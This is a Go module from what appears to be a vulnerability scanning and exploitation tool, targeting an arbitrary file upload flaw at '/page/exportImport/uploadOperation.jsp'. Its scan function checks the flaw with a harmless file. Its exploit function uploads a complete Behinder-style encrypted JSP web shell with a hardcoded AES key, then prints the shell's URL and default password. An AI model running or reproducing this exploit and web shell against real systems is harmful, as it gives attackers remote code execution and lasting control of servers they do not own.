package vulners

import (
	"bytes"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"io"
	"strings"
)

type Wc13 struct {
}

func (s *Wc13) Scan(targetUrl string) {
	vulnerable, err := Wc13scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wc13] 存在UploaderOperate 任意文件上传")
	} else {
		color.White("[Wc13] 不存在UploaderOperate 任意文件上传")
	}
}

func (*Wc13) Exploit(targetUrl string) {
	runResult, err := Wc13runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wc13scancore(targetUrl string) (bool, error) {
	url := "/page/exportImport/uploadOperation.jsp"
	data := []byte("helloword")
	_, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "file",
		FileName:  "123.txt",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	url1 := "/page/exportImport/fileTransfer/123.txt"
	resp, err := baseClient.NewRequest().SetHeader("Content-Type", "application/x-www-form-urlencoded").Get(targetUrl + url1)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "helloword") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wc13runcore(targetUrl string) (string, error) {
	url := "/page/exportImport/uploadOperation.jsp"
	data := []byte("hello<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>")
	_, err := baseClient.NewRequest().SetFileUpload(req.FileUpload{
		ParamName: "file",
		FileName:  "1ndex.jsp",
		GetFileContent: func() (io.ReadCloser, error) {
			return io.NopCloser(bytes.NewBuffer(data)), nil
		},
		FileSize:    int64(len(data)),
		ContentType: "image/jpeg",
	}).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	url1 := "/page/exportImport/fileTransfer/1ndex.jsp"
	resp, err := baseClient.NewRequest().Get(targetUrl + url1)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "hello") {
		return "存在UploaderOperate 任意文件上传,冰蝎:" + targetUrl + "/page/exportImport/fileTransfer/1ndex.jsp 默认密码", nil
	} else {
		return "", nil
	}
}
